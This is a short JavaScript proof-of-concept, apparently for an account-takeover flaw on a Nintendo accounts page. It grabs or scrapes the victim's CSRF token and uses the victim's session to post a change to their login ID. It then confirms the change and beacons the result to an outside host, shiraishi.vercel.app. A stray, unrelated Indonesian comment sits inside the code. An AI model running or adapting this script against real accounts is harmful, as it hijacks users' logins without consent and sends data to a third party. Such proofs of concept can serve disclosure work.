(async () => {
  const log = (...a) => console.log('[PoC]', ...a);
// kalo cuma tentang perasaan tapi ga punya perusahaan, apa kata temen papa?
  let csrf =
    document.querySelector('input[name="csrf_token"]')?.value ||
    new URLSearchParams(location.search).get('csrf_token');

  if (!csrf) {
    const html = await (await fetch('/login_id/edit', { credentials: 'include' })).text();
    const m = html.match(/name="csrf_token"\s+value="([^"]+)"/);
    csrf = m?.[1];
  }

  if (!csrf) return log('No CSRF token — aborting');

  const body = new URLSearchParams({
    login_id: 'poc_takeover_proof',
    csrf_token: csrf,
    post_login_id_edit_redirect_uri: 'https://accounts.nintendo.com/'
  });

  const res = await fetch('/login_id/edit', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body
  });

  log('status', res.status, 'final URL', res.url);

  const after = await (await fetch('/login_id/edit', { credentials: 'include' })).text();
  const changed = after.includes('poc_takeover_proof');
  log('login_id changed:', changed);

  fetch('https://shiraishi.vercel.app/log?ok=' + changed + '&id=' + encodeURIComponent('poc_takeover_proof'));
})();
